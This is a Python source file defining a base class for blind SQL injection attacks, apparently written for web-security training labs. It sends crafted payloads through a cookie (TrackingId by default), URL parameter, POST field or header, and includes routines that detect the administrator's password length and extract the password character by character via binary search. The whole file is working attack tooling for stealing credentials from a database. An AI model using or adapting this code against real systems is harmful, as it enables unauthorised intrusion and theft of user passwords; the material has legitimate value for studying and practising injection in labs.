import requests
from .dbConfig import DB_CONFIG
import time

class BaseSQLi:
    def __init__(self, url, targetTable, db_type="oracle", inject_point=None, extra_cookies=None):
        self.url = url
        self.targetTable = targetTable
        self.db_type = db_type
        self.inject_point = inject_point or {"location": "cookie", "param": "TrackingId"}
        self.extra_cookies = extra_cookies or {}
        self.session = requests.Session()
        self._send_methods = {
            "cookie": self._sendCookie,
            "url_param": self._sendUrlParam,
            "post": self._sendPost,
            "header": self._sendHeader
        }

    def send(self, payload):
        location = self.inject_point["location"]
        if location in self._send_methods:
            return self._send_methods[location](payload)
        else:
            raise ValueError(f"Unsupported injection location: {location}")

    def build_payload(self, sql_expression):
        config = DB_CONFIG[self.db_type]
        concat = config["concat"]
        if concat in ("||", "+"):
            return f"'{concat}({sql_expression}){concat}'"
        else:
            return f"' AND ({sql_expression}){config['comment']}"

    def extract(self, column):
        raise NotImplementedError("Subclasses should implement this method.")

    def _sendCookie(self, payload):
        param = self.inject_point["param"]
        cookies = {param: payload, **self.extra_cookies}
        return self.session.get(self.url, cookies=cookies)

    def _sendUrlParam(self, payload):
        param = self.inject_point["param"]
        return self.session.get(self.url, params={param: payload}, cookies=self.extra_cookies)

    def _sendPost(self, payload):
        param = self.inject_point["param"]
        return self.session.post(self.url, data={param: payload}, cookies=self.extra_cookies)

    def _sendHeader(self, payload):
        param = self.inject_point["param"]
        headers = {param: payload}
        return self.session.get(self.url, headers=headers, cookies=self.extra_cookies)


    def build_condition_payload(self, condition):
        raise NotImplementedError("Subclasses should implement this method.")

    def check_signal(self, response):
        raise NotImplementedError("Subclasses should implement this method.")

    def detect_length(self, column, username='administrator'):
        print("[*] Detecting password length...")
        for length in range(1, 51):
            condition = f"LENGTH((SELECT {column} FROM {self.targetTable} WHERE username='{username}'))={length}"
            payload = self.build_condition_payload(condition)
            response = self.send(payload)
            if self.check_signal(response):
                print(f"[+] Password length: {length}")
                return length
        print("[-] Could not detect password length.")
        return None

    def extract_char_binary(self, column, position, username='administrator'):
        substr = DB_CONFIG[self.db_type]['substr']
        low = 32
        high = 126
        while low < high:
            mid = (low + high) // 2
            condition = f"ASCII({substr}((SELECT {column} FROM {self.targetTable} WHERE username='{username}'),{position},1))>{mid}"
            payload = self.build_condition_payload(condition)
            response = self.send(payload)
            if self.check_signal(response):
                low = mid + 1
            else:
                high = mid
        return chr(low)